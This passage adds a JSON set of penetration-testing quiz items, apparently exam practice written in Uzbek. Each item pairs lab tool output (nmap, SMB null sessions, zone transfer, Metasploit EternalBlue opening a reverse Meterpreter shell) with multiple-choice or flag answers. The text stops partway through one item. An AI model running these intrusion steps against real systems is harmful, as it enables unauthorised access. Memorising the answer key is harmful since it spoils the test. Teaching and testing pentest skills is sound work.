@@ -1,0 +1,2898 @@
+[
+ {
+  "id": "am-001",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p- 10.10.10.5\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3\n80/tcp   open  http        Apache httpd 2.4.29\n445/tcp  open  microsoft-ds Samba smbd 4.6.2\n3306/tcp open  mysql       MySQL 5.7.29",
+  "question": "445-portda qaysi servis va versiya ishlamoqda?",
+  "options": [
+   "Samba smbd 3.0.20",
+   "Samba smbd 4.6.2",
+   "Windows SMB",
+   "MySQL 5.7.29"
+  ],
+  "answer": "Samba smbd 4.6.2",
+  "explanation": "nmap -sV chiqishida 445/tcp qatorida VERSION ustunida 'Samba smbd 4.6.2' ko'rsatilgan."
+ },
+ {
+  "id": "am-002",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sn 10.10.10.0/24\nNmap scan report for 10.10.10.1\nHost is up (0.012s latency).\nNmap scan report for 10.10.10.5\nHost is up (0.014s latency).\nNmap scan report for 10.10.10.12\nHost is up (0.011s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned",
+  "question": "Ushbu ping sweep (-sn) natijasida nechta host tirik (up) topildi?",
+  "options": [
+   "256",
+   "3",
+   "5",
+   "12"
+  ],
+  "answer": "3",
+  "explanation": "nmap -sn host discovery qiladi. Chiqishning oxirida '3 hosts up' — ya'ni 3 ta tirik host topilgan."
+ },
+ {
+  "id": "am-003",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 21 10.10.10.8\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4",
+  "question": "21-portdagi FTP server versiyasini yozing (masalan: vsftpd 2.3.4 -> faqat versiya raqami).",
+  "answer": "2.3.4",
+  "explanation": "vsftpd 2.3.4 — mashhur backdoor'li versiya. Versiya raqami 2.3.4."
+ },
+ {
+  "id": "am-004",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -O 10.10.10.5\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 2 hops",
+  "question": "nmap OS detection natijasiga ko'ra target qaysi operatsion tizimda ishlamoqda?",
+  "options": [
+   "Windows Server 2016",
+   "Linux (kernel 4.15 - 5.6)",
+   "FreeBSD",
+   "macOS"
+  ],
+  "answer": "Linux (kernel 4.15 - 5.6)",
+  "explanation": "'OS details: Linux 4.15 - 5.6' — nmap OS detection targetni Linux deb aniqlagan."
+ },
+ {
+  "id": "am-005",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 445 --script smb-os-discovery 10.10.10.12\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1\n|   Computer name: WIN-SRV01\n|   NetBIOS computer name: WIN-SRV01\n|   Domain name: corp.local\n|_  FQDN: WIN-SRV01.corp.local",
+  "question": "smb-os-discovery NSE skripti target domenini qanday aniqladi?",
+  "options": [
+   "workgroup.local",
+   "corp.local",
+   "WIN-SRV01",
+   "windows.local"
+  ],
+  "answer": "corp.local",
+  "explanation": "Chiqishda 'Domain name: corp.local' ko'rsatilgan — SMB orqali domen nomi aniqlandi."
+ },
+ {
+  "id": "am-006",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 80 --script http-title 10.10.10.20\nPORT   STATE SERVICE\n80/tcp open  http\n|_http-title: Admin Login - Acme Corp CMS",
+  "question": "http-title skriptiga ko'ra veb-sahifa sarlavhasi nima?",
+  "options": [
+   "Acme Corp — Home",
+   "Admin Login - Acme Corp CMS",
+   "404 Not Found",
+   "Apache2 Default Page"
+  ],
+  "answer": "Admin Login - Acme Corp CMS",
+  "explanation": "http-title HTML <title> tegini o'qiydi: 'Admin Login - Acme Corp CMS'."
+ },
+ {
+  "id": "am-007",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 443 --script ssl-cert 10.10.10.30\n| ssl-cert: Subject: commonName=mail.megacorp.local\n| Subject Alternative Name: DNS:mail.megacorp.local, DNS:webmail.megacorp.local\n| Not valid before: 2025-01-10\n|_Not valid after:  2026-01-10",
+  "question": "SSL sertifikatning commonName (CN) qiymatini yozing.",
+  "answer": "mail.megacorp.local",
+  "explanation": "ssl-cert skripti Subject'da commonName=mail.megacorp.local ni ko'rsatadi — bu ichki hostname'ni oshkor qiladi."
+ },
+ {
+  "id": "am-008",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 21 --script ftp-anon 10.10.10.8\nPORT   STATE SERVICE\n21/tcp open  ftp\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--    1 0        0             482 Feb 11  2025 backup.zip\n|_-rw-r--r--    1 0        0            1024 Feb 11  2025 notes.txt",
+  "question": "ftp-anon skripti nimani aniqladi?",
+  "options": [
+   "FTP parol bilan himoyalangan",
+   "Anonim (parolsiz) FTP kirish ochiq",
+   "FTP porti yopiq",
+   "Faqat SFTP ruxsat berilgan"
+  ],
+  "answer": "Anonim (parolsiz) FTP kirish ochiq",
+  "explanation": "'Anonymous FTP login allowed (FTP code 230)' — anonim kirish ochiq, fayllarni ko'rish mumkin."
+ },
+ {
+  "id": "am-009",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "enum4linux"
+  ],
+  "scenario": "$ enum4linux -U 10.10.10.12\n[+] Getting domain SID for 10.10.10.12\n[+] Enumerating users using SID S-1-5-21-...\nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[jdoe] rid:[0x3e9]\nuser:[svc_backup] rid:[0x3ea]\nuser:[mjones] rid:[0x3eb]",
+  "question": "enum4linux orqali topilgan xizmat (service) hisobiga o'xshaydigan foydalanuvchi qaysi?",
+  "options": [
+   "jdoe",
+   "guest",
+   "svc_backup",
+   "administrator"
+  ],
+  "answer": "svc_backup",
+  "explanation": "'svc_backup' — 'svc_' prefiksi service account'ni bildiradi (masalan backup xizmati)."
+ },
+ {
+  "id": "am-010",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "smbclient"
+  ],
+  "scenario": "$ smbclient -L //10.10.10.12 -N\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        backups         Disk      Nightly backups\n        print$          Disk      Printer Drivers",
+  "question": "Standart bo'lmagan (maxsus yaratilgan) va ma'lumot bo'lishi mumkin bo'lgan share qaysi?",
+  "options": [
+   "ADMIN$",
+   "C$",
+   "backups",
+   "IPC$"
+  ],
+  "answer": "backups",
+  "explanation": "ADMIN$, C$, IPC$, print$ — standart administrativ share'lar. 'backups' — qo'lda yaratilgan, unda qimmatli fayllar bo'lishi mumkin."
+ },
+ {
+  "id": "am-011",
+  "domain": "assessment_methodologies",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "smbclient"
+  ],
+  "scenario": "$ smbclient //10.10.10.12/backups -N\nsmb: \\> ls\n  flag_user.txt          A       36  Mon Feb 10 09:20:11 2025\nsmb: \\> get flag_user.txt\nsmb: \\> exit\n$ cat flag_user.txt\nEJPT{smb_null_s3ssion_l00t}",
+  "question": "Anonim SMB share'dan olingan flag qiymatini kiriting.",
+  "answer": "EJPT{smb_null_s3ssion_l00t}",
+  "explanation": "Null session (-N) bilan 'backups' share'ga kirib, flag_user.txt yuklab olindi: EJPT{smb_null_s3ssion_l00t}."
+ },
+ {
+  "id": "am-012",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 25 10.10.10.9\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\n$ nc 10.10.10.9 25\n220 mail.corp.local ESMTP Postfix (Ubuntu)",
+  "question": "25-portdagi banner qaysi mail server dasturini ko'rsatmoqda?",
+  "options": [
+   "Exchange",
+   "Sendmail",
+   "Postfix",
+   "Exim"
+  ],
+  "answer": "Postfix",
+  "explanation": "Banner '220 ... ESMTP Postfix (Ubuntu)' — mail server Postfix ekanini oshkor qiladi."
+ },
+ {
+  "id": "am-013",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 3389 --script rdp-ntlm-info 10.10.10.15\n| rdp-ntlm-info:\n|   Target_Name: FINANCE\n|   NetBIOS_Domain_Name: FINANCE\n|   DNS_Computer_Name: DC01.finance.local\n|_  Product_Version: 10.0.17763",
+  "question": "rdp-ntlm-info skriptiga ko'ra target kompyuterning to'liq DNS nomi (FQDN) nima?",
+  "answer": "DC01.finance.local",
+  "explanation": "'DNS_Computer_Name: DC01.finance.local' — RDP NTLM ma'lumoti orqali FQDN oshkor bo'ldi (bu Domain Controller)."
+ },
+ {
+  "id": "am-014",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "theHarvester"
+  ],
+  "scenario": "$ theHarvester -d megacorp.com -b bing\n[*] Emails found:\n----------------\nadmin@megacorp.com\nj.smith@megacorp.com\nhr@megacorp.com\n\n[*] Hosts found:\n----------------\nvpn.megacorp.com\nmail.megacorp.com",
+  "question": "theHarvester (passiv OSINT) ushbu ishda nimani to'pladi?",
+  "options": [
+   "Faqat ochiq portlar",
+   "Email manzillar va subdomenlar",
+   "Parollar",
+   "Metasploit modullari"
+  ],
+  "answer": "Email manzillar va subdomenlar",
+  "explanation": "theHarvester passiv recon vositasi — ochiq manbalardan email va hostlarni (subdomenlarni) to'playdi, targetga to'g'ridan-to'g'ri tegmaydi."
+ },
+ {
+  "id": "am-015",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sS -p 1-1000 10.10.10.5\nPORT    STATE    SERVICE\n22/tcp  open     ssh\n80/tcp  open     http\n135/tcp filtered msrpc\n443/tcp closed   https",
+  "question": "Firewall tomonidan bloklangan (javob bermayotgan) portning holati qaysi?",
+  "options": [
+   "open",
+   "closed",
+   "filtered",
+   "unfiltered"
+  ],
+  "answer": "filtered",
+  "explanation": "'filtered' — paket firewall/filter tomonidan tashlangan, javob yo'q. 'closed' — port yopiq lekin host RST qaytaradi."
+ },
+ {
+  "id": "am-016",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 445 --script smb-enum-shares,smb-enum-users 10.10.10.40\n| smb-enum-shares:\n|   \\\\10.10.10.40\\IPC$: <anonymous access>\n|   \\\\10.10.10.40\\data: READ\n| smb-enum-users:\n|   CORP\\administrator\n|_  CORP\\helpdesk",
+  "question": "smb-enum-shares natijasiga ko'ra 'data' share'iga qanday ruxsat bor?",
+  "options": [
+   "READ (o'qish)",
+   "WRITE (yozish)",
+   "Ruxsat yo'q",
+   "FULL CONTROL"
+  ],
+  "answer": "READ (o'qish)",
+  "explanation": "'\\\\10.10.10.40\\data: READ' — data share'iga o'qish ruxsati bor, fayllarni ko'chirib olish mumkin."
+ },
+ {
+  "id": "am-017",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "nmap",
+   "netcat"
+  ],
+  "scenario": "$ nc -nv 10.10.10.5 22\n(UNKNOWN) [10.10.10.5] 22 (ssh) open\nSSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
+  "question": "Netcat banner grab natijasiga ko'ra SSH server versiyasini yozing (OpenSSH ... shaklida).",
+  "answer": "OpenSSH_8.2p1",
+  "explanation": "SSH banneri 'SSH-2.0-OpenSSH_8.2p1 ...' — server OpenSSH_8.2p1 ekanini oshkor qiladi. Banner grab — enumeration'ning asosiy usuli."
+ },
+ {
+  "id": "am-018",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV --script vuln -p 445 10.10.10.7\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|_    Risk factor: HIGH",
+  "question": "nmap vuln skripti aniqlagan zaiflik qaysi mashhur ekspluatatsiyaga tegishli?",
+  "options": [
+   "Heartbleed",
+   "EternalBlue (MS17-010)",
+   "Shellshock",
+   "Log4Shell"
+  ],
+  "answer": "EternalBlue (MS17-010)",
+  "explanation": "smb-vuln-ms17-010 / CVE-2017-0143 — bu EternalBlue, SMBv1 dagi RCE zaifligi."
+ },
+ {
+  "id": "am-019",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "searchsploit"
+  ],
+  "scenario": "$ searchsploit vsftpd 2.3.4\n------------------------------------------------------------\n Exploit Title                            |  Path\n------------------------------------------------------------\n vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py\n------------------------------------------------------------",
+  "question": "searchsploit natijasiga ko'ra vsftpd 2.3.4 da qanday zaiflik bor?",
+  "options": [
+   "Buffer overflow",
+   "Backdoor Command Execution",
+   "SQL Injection",
+   "Directory Traversal"
+  ],
+  "answer": "Backdoor Command Execution",
+  "explanation": "searchsploit local Exploit-DB nusxasidan qidiradi: vsftpd 2.3.4 — 'Backdoor Command Execution'."
+ },
+ {
+  "id": "am-020",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 8080 10.10.10.22\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat 9.0.30",
+  "question": "8080-portda qanday dastur ishlamoqda?",
+  "options": [
+   "nginx",
+   "Apache Tomcat",
+   "IIS",
+   "Jetty"
+  ],
+  "answer": "Apache Tomcat",
+  "explanation": "-sV chiqishida 'Apache Tomcat 9.0.30' — Java application server 8080-portda ishlamoqda."
+ },
+ {
+  "id": "am-021",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 161 -sU --script snmp-info 10.10.10.33\nPORT    STATE SERVICE\n161/udp open  snmp\n| snmp-info:\n|   enterprise: net-snmp\n|   engineIDData: ...\n|_  snmpEngineBoots: 12",
+  "question": "161-portda qaysi protokol ishlamoqda va u qaysi transport turida?",
+  "options": [
+   "SNMP over TCP",
+   "SNMP over UDP",
+   "SMTP over UDP",
+   "SSH over UDP"
+  ],
+  "answer": "SNMP over UDP",
+  "explanation": "161/udp — SNMP UDP protokoli. -sU UDP skanini bildiradi. SNMP ko'pincha enumeration uchun qimmatli."
+ },
+ {
+  "id": "am-022",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 88,389,445,636 10.10.10.100\nPORT    STATE SERVICE\n88/tcp  open  kerberos-sec\n389/tcp open  ldap\n445/tcp open  microsoft-ds\n636/tcp open  ldapssl",
+  "question": "Ushbu ochiq portlar (88, 389, 636) kombinatsiyasi target qanday rol bajarayotganini ko'rsatadi?",
+  "options": [
+   "Veb-server",
+   "Domain Controller (Active Directory)",
+   "Mail relay",
+   "DNS resolver"
+  ],
+  "answer": "Domain Controller (Active Directory)",
+  "explanation": "Kerberos (88) + LDAP (389/636) + SMB (445) — bu klassik Domain Controller belgilari."
+ },
+ {
+  "id": "am-023",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "dig"
+  ],
+  "scenario": "$ dig axfr @10.10.10.2 corp.local\n; <<>> DiG 9.16 <<>> axfr @10.10.10.2 corp.local\ncorp.local.      IN SOA  ns1.corp.local. admin.corp.local.\ncorp.local.      IN NS   ns1.corp.local.\nintranet.corp.local. IN A  10.10.10.50\ndev.corp.local.      IN A  10.10.10.51\nns1.corp.local.      IN A  10.10.10.2",
+  "question": "Zone transfer (AXFR) orqali oshkor bo'lgan 'dev' subdomeni qaysi IP ga ishora qiladi?",
+  "answer": "10.10.10.51",
+  "explanation": "Ochiq zone transfer barcha DNS yozuvlarni beradi: dev.corp.local -> 10.10.10.51. Bu noto'g'ri sozlangan DNS'da enumeration usuli."
+ },
+ {
+  "id": "am-024",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "whatweb"
+  ],
+  "scenario": "$ whatweb http://10.10.10.20\nhttp://10.10.10.20 [200 OK] Apache[2.4.29], Country[RESERVED], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], PHP[7.2.24], WordPress[5.4.2]",
+  "question": "whatweb natijasiga ko'ra sayt qaysi CMS'da qurilgan?",
+  "options": [
+   "Joomla",
+   "Drupal",
+   "WordPress",
+   "Magento"
+  ],
+  "answer": "WordPress",
+  "explanation": "whatweb 'WordPress[5.4.2]' ni aniqladi — sayt WordPress 5.4.2 da ishlaydi (keyin WPScan ishlatiladi)."
+ },
+ {
+  "id": "am-025",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 6379 10.10.10.44\nPORT     STATE SERVICE VERSION\n6379/tcp open  redis   Redis key-value store 5.0.7\n$ redis-cli -h 10.10.10.44 ping\nPONG",
+  "question": "6379-portda parolsiz javob berayotgan servis qaysi?",
+  "options": [
+   "MongoDB",
+   "Redis",
+   "Memcached",
+   "PostgreSQL"
+  ],
+  "answer": "Redis",
+  "explanation": "6379 — Redis'ning standart porti. 'PONG' javobi — Redis autentifikatsiyasiz ochiq (xavfli konfiguratsiya)."
+ },
+ {
+  "id": "am-026",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -F 10.10.10.5\n(Fast scan — 100 most common ports)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http",
+  "question": "nmap -F bayrog'i nimani anglatadi?",
+  "options": [
+   "Barcha 65535 portni skanlaydi",
+   "Eng ko'p ishlatiladigan 100 ta portni tez skanlaydi",
+   "Faqat UDP portlarni skanlaydi",
+   "Firewall'ni chetlab o'tadi"
+  ],
+  "answer": "Eng ko'p ishlatiladigan 100 ta portni tez skanlaydi",
+  "explanation": "-F (fast) — eng mashhur 100 ta portni skanlaydi, to'liq skandan tezroq."
+ },
+ {
+  "id": "am-027",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 2049 --script nfs-showmount 10.10.10.55\nPORT     STATE SERVICE\n2049/tcp open  nfs\n| nfs-showmount:\n|_  /srv/share  10.10.10.0/24",
+  "question": "nfs-showmount natijasiga ko'ra qaysi katalog tarmoqqa eksport qilingan?",
+  "options": [
+   "/etc/passwd",
+   "/srv/share",
+   "/root",
+   "/var/log"
+  ],
+  "answer": "/srv/share",
+  "explanation": "NFS export ro'yxatida '/srv/share 10.10.10.0/24' — bu katalog butun tarmoqqa mount qilinishi mumkin."
+ },
+ {
+  "id": "am-028",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 3306 10.10.10.5\nPORT     STATE SERVICE VERSION\n3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1",
+  "question": "Ma'lumotlar bazasi qaysi portda ishlamoqda? (port raqamini yozing)",
+  "answer": "3306",
+  "explanation": "3306 — MySQL'ning standart porti. -sV MySQL 5.7.29 versiyasini ham aniqladi."
+ },
+ {
+  "id": "am-029",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 80 --script http-enum 10.10.10.20\n| http-enum:\n|   /admin/: Possible admin folder\n|   /backup/: Backup folder\n|   /phpmyadmin/: phpMyAdmin\n|_  /robots.txt: Robots file",
+  "question": "http-enum skripti topgan ma'lumotlar bazasini boshqarish paneli qaysi?",
+  "options": [
+   "/admin/",
+   "/backup/",
+   "/phpmyadmin/",
+   "/robots.txt"
+  ],
+  "answer": "/phpmyadmin/",
+  "explanation": "phpMyAdmin — MySQL'ni veb orqali boshqarish paneli; ko'pincha zaif parol yoki ochiq bo'ladi."
+ },
+ {
+  "id": "am-030",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p- -T4 10.10.10.5\n...\n8443/tcp open  https-alt\n$ curl -sk https://10.10.10.5:8443/ | grep -i title\n<title>pfSense - Login</title>",
+  "question": "Standart bo'lmagan 8443-portda qanday tizim ishlamoqda?",
+  "options": [
+   "Jenkins",
+   "pfSense (firewall boshqaruvi)",
+   "GitLab",
+   "Grafana"
+  ],
+  "answer": "pfSense (firewall boshqaruvi)",
+  "explanation": "8443 ko'pincha alternativ HTTPS. Title 'pfSense - Login' — bu pfSense firewall'ning boshqaruv paneli."
+ },
+ {
+  "id": "am-031",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "# Passiv vs Aktiv recon\nTexnika A: theHarvester bilan Google/Bing'dan email yig'ish\nTexnika B: nmap bilan target portlarini skanlash",
+  "question": "Qaysi texnika PASSIV recon hisoblanadi (targetga to'g'ridan-to'g'ri paket yubormaydi)?",
+  "options": [
+   "Texnika B (nmap skan)",
+   "Texnika A (theHarvester OSINT)",
+   "Ikkalasi ham",
+   "Hech qaysi"
+  ],
+  "answer": "Texnika A (theHarvester OSINT)",
+  "explanation": "Passiv recon targetga tegmaydi — ochiq manbalardan (Google, Bing) ma'lumot yig'adi. nmap esa aktiv (paket yuboradi)."
+ },
+ {
+  "id": "am-032",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 5985 -sV 10.10.10.60\nPORT     STATE SERVICE    VERSION\n5985/tcp open  http        Microsoft HTTPAPI httpd 2.0 (WinRM)",
+  "question": "5985-portdagi WinRM servisi nima uchun ishlatiladi?",
+  "options": [
+   "Fayl almashish",
+   "Windows'ni masofadan boshqarish (remote management)",
+   "Email yuborish",
+   "DNS so'rovlari"
+  ],
+  "answer": "Windows'ni masofadan boshqarish (remote management)",
+  "explanation": "WinRM (5985) — Windows Remote Management; credential bo'lsa evil-winrm bilan shell olish mumkin."
+ },
+ {
+  "id": "am-033",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 27017 10.10.10.70\nPORT      STATE SERVICE VERSION\n27017/tcp open  mongodb MongoDB 3.6.8",
+  "question": "27017-portdagi NoSQL ma'lumotlar bazasining nomini yozing.",
+  "answer": "MongoDB",
+  "explanation": "27017 — MongoDB'ning standart porti. Ko'pincha autentifikatsiyasiz ochiq bo'ladi."
+ },
+ {
+  "id": "am-034",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -Pn -p 80,443 10.10.10.5\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nPORT    STATE SERVICE\n80/tcp  open  http\n443/tcp open  https",
+  "question": "-Pn bayrog'i nima uchun kerak bo'ldi?",
+  "options": [
+   "UDP skanlash uchun",
+   "Host ping (ICMP) so'rovlarni bloklaganda skanni davom ettirish uchun",
+   "Servis versiyasini aniqlash uchun",
+   "OS'ni aniqlash uchun"
+  ],
+  "answer": "Host ping (ICMP) so'rovlarni bloklaganda skanni davom ettirish uchun",
+  "explanation": "-Pn host discovery (ping) ni o'tkazib yuboradi va hostni 'tirik' deb hisoblab portlarni skanlaydi — ICMP bloklanganda foydali."
+ },
+ {
+  "id": "am-035",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 23 -sV 10.10.10.5\nPORT   STATE SERVICE VERSION\n23/tcp open  telnet  Linux telnetd",
+  "question": "23-portdagi ochiq servis nima uchun xavfli hisoblanadi?",
+  "options": [
+   "U shifrlangan",
+   "Telnet trafikni ochiq (shifrlanmagan) uzatadi",
+   "Faqat ichki tarmoqda ishlaydi",
+   "U eskirmagan protokol"
+  ],
+  "answer": "Telnet trafikni ochiq (shifrlanmagan) uzatadi",
+  "explanation": "Telnet (23) credential va buyruqlarni ochiq matnda yuboradi — sniff qilinishi mumkin. SSH bilan almashtirilishi kerak."
+ },
+ {
+  "id": "am-036",
+  "domain": "assessment_methodologies",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 502 -sV 10.10.10.80\nPORT    STATE SERVICE VERSION\n502/tcp open  mbap    Modbus\n| modbus-discover:\n|   sid 0x1: SCADA-PLC-01",
+  "question": "502-portdagi Modbus protokoli qanday muhitni ko'rsatadi?",
+  "options": [
+   "Veb-hosting",
+   "ICS/SCADA (sanoat boshqaruv tizimlari)",
+   "Bulutli xizmat",
+   "VoIP telefoniya"
+  ],
+  "answer": "ICS/SCADA (sanoat boshqaruv tizimlari)",
+  "explanation": "Modbus (502) — sanoat boshqaruv tizimlari (ICS/SCADA) protokoli; PLC qurilmalarni boshqaradi."
+ },
+ {
+  "id": "hnp-001",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > search ms17-010\nMatching Modules\n================\n   #  Name                                      Rank    Description\n   0  exploit/windows/smb/ms17_010_eternalblue  average MS17-010 EternalBlue SMB RCE\n   1  auxiliary/scanner/smb/smb_ms17_010        normal  MS17-010 SMB RCE Detection",
+  "question": "MS17-010 zaifligini ekspluatatsiya qilish uchun (aniqlash emas) qaysi modul kerak?",
+  "options": [
+   "auxiliary/scanner/smb/smb_ms17_010",
+   "exploit/windows/smb/ms17_010_eternalblue",
+   "post/windows/gather/hashdump",
+   "auxiliary/scanner/smb/smb_version"
+  ],
+  "answer": "exploit/windows/smb/ms17_010_eternalblue",
+  "explanation": "'exploit/...eternalblue' RCE beradi. 'auxiliary/scanner' faqat zaiflikni tekshiradi, ekspluatatsiya qilmaydi."
+ },
+ {
+  "id": "hnp-002",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(windows/smb/ms17_010_eternalblue) > show options\nModule options:\n   Name    Current Setting  Required\n   RHOSTS                   yes\n   RPORT   445              yes\nPayload options:\n   LHOST                    yes\n   LPORT   4444             yes",
+  "question": "Ushbu modulda targetning IP manzilini qaysi o'zgaruvchiga o'rnatish kerak?",
+  "options": [
+   "LHOST",
+   "RHOSTS",
+   "LPORT",
+   "SRVHOST"
+  ],
+  "answer": "RHOSTS",
+  "explanation": "RHOSTS (Remote HOST) — target IP. LHOST — hujumchining (Kali) IP si reverse ulanish uchun."
+ },
+ {
+  "id": "hnp-003",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit",
+   "meterpreter"
+  ],
+  "scenario": "msf6 exploit(...) > run\n[*] Started reverse TCP handler on 10.10.14.5:4444\n[*] 10.10.10.7:445 - Connecting to target...\n[+] 10.10.10.7:445 - The target is vulnerable.\n[*] Sending stage (200262 bytes) to 10.10.10.7\n[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.7:49158)",
+  "question": "Ekspluatatsiya natijasida nima yuz berdi?",
+  "options": [
+   "Exploit ishlamadi",
+   "Meterpreter sessiyasi ochildi",
+   "Target o'chib qoldi",
+   "Faqat port skanlandi"
+  ],
+  "answer": "Meterpreter sessiyasi ochildi",
+  "explanation": "'Meterpreter session 1 opened' — reverse ulanish orqali Meterpreter shell muvaffaqiyatli ochildi."
+ },
+ {
+  "id": "hnp-004",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM",
+  "question": "getuid natijasi qanday imtiyoz darajasini ko'rsatmoqda?",
+  "options": [
+   "Oddiy foydalanuvchi",
+   "Guest",
+   "NT AUTHORITY\\SYSTEM (eng yuqori)",
+   "Administrator emas"
+  ],
+  "answer": "NT AUTHORITY\\SYSTEM (eng yuqori)",
